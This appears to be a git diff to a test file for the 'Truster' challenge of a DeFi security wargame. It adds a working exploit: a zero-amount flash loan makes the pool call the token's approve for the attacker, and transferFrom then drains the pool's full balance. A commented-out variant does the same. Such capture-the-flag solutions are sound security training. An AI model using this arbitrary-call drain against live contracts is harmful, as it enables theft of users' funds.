@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { web3 } = require('@openzeppelin/test-helpers/src/setup');
+
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -26,10 +28,33 @@ describe('[Challenge] Truster', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal('0');
     });
-
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+        const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
+        await this.pool.flashLoan(
+            0,
+            attacker.address,
+            this.token.address,
+            iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
+        );
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
+    })
+
+    // it('Exploit', async function () {
+    //     const data = web3.eth.abi.encodeFunctionCall({
+    //         name: 'approve',
+    //         type: 'function',
+    //         inputs: [{
+    //             type: 'address',
+    //             name: 'spender'
+    //         },{
+    //             type: 'uint256',
+    //             name: 'amount'
+    //         }]
+    //     }, [attacker.address, TOKENS_IN_POOL.toString()]);
+
+    //     await this.pool.flashLoan(0, attacker.address, this.token.address, data)
+    //     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
+    // });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
